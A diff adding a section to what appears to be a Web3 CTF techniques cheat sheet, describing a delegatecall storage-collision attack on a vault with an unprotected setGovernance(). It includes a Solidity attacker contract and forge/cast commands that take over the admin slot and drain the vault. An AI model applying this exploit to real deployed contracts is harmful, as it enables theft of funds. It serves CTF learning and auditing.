@@ -8,6 +8,7 @@
 - [Non-Standard ABI Calldata Encoding](#non-standard-abi-calldata-encoding)
 - [Solidity bytes32 String Encoding](#solidity-bytes32-string-encoding)
 - [Complete Exploit Flow (House of Illusions)](#complete-exploit-flow-house-of-illusions)
+- [Delegatecall Storage Context Abuse (EHAX 2026)](#delegatecall-storage-context-abuse-ehax-2026)
 - [Web3 CTF Tips](#web3-ctf-tips)
 
 ---
@@ -121,6 +122,54 @@ cast send $PROXY $CRAFTED_CALLDATA --private-key $KEY --rpc-url $RPC
 cast send $PROXY "appointCurator(address)" $MY_ADDR --private-key $KEY --rpc-url $RPC
 cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
 ```
+
+---
+
+## Delegatecall Storage Context Abuse (EHAX 2026)
+
+**Pattern (Heist v1):** Vault contract with `execute()` that does `delegatecall` to a governance contract. `setGovernance()` has **no access control**.
+
+**Storage layout awareness:** `delegatecall` runs callee code in caller's storage context. If vault has:
+- Slot 0: `paused` (bool) + `fee` (uint248) — packed
+- Slot 1: `admin` (address)
+- Slot 2: `governance` (address)
+
+Writing to slot 0/1 in the delegated contract modifies the vault's `paused` and `admin`.
+
+**Attack chain:**
+1. Deploy attacker contract matching vault's storage layout
+2. `setGovernance(attacker_address)` — no access control
+3. `execute(abi.encodeWithSignature("attack(address)", player))` — delegatecall
+4. Attacker's `attack()` writes `paused=false` to slot 0, `admin=player` to slot 1
+5. `withdraw()` — now authorized as admin with vault unpaused
+
+```solidity
+contract Attacker {
+    bool public paused;      // slot 0 (match vault layout)
+    uint248 public fee;      // slot 0
+    address public admin;    // slot 1
+    address public governance; // slot 2
+
+    function attack(address _newAdmin) public {
+        paused = false;
+        admin = _newAdmin;
+    }
+}
+```
+
+```bash
+# Deploy attacker
+forge create Attacker.sol:Attacker --rpc-url $RPC --private-key $KEY
+# Hijack governance
+cast send $VAULT "setGovernance(address)" $ATTACKER --rpc-url $RPC --private-key $KEY
+# Execute delegatecall
+CALLDATA=$(cast calldata "attack(address)" $PLAYER)
+cast send $VAULT "execute(bytes)" $CALLDATA --rpc-url $RPC --private-key $KEY
+# Drain
+cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
+```
+
+**Key insight:** Always check if `setGovernance()` / `setImplementation()` / upgrade functions have access control. Unprotected governance setters + delegatecall = full storage control.
 
 ---
 
